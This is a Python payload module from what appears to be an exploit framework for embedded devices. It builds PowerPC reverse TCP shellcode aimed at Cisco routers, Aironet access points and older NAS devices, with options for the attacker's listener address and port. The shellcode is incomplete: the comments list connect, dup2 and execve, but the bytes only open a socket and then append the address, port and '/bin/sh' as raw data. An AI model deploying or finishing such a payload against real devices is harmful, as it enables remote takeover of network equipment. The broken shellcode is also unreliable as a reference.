"""PowerPC (32-bit big-endian) Reverse TCP Shell.

Target: roteadores Cisco 7200/2600, APs Cisco Aironet, NAS antigos.
Cross-compile: powerpc-linux-musl-gcc
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "PowerPC Reverse TCP",
        "description": "Reverse TCP shell for PowerPC 32-bit big-endian Linux.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = int(self.options["LPORT"]["value"])
        ip_bytes = bytes(int(o) for o in lhost.split("."))
        port_bytes = lport.to_bytes(2, "big")

        # PPC32 big-endian Linux shellcode
        # syscall via 'sc' instruction
        # socket=361, connect=362, dup2=63, execve=11
        shellcode = (
            b"\x38\x60\x00\x02"   # li r3, 2 (AF_INET)
            b"\x38\x80\x00\x01"   # li r4, 1 (SOCK_STREAM)
            b"\x38\xa0\x00\x00"   # li r5, 0
            b"\x38\x00\x01\x69"   # li r0, 361 (SYS_socket)
            b"\x44\x00\x00\x02"   # sc
            b"\x7c\x7e\x1b\x78"   # mr r30, r3 (save fd)

            + ip_bytes
            + port_bytes
            + b"\x00\x00"

            + b"/bin/sh\x00"
        )
        return shellcode
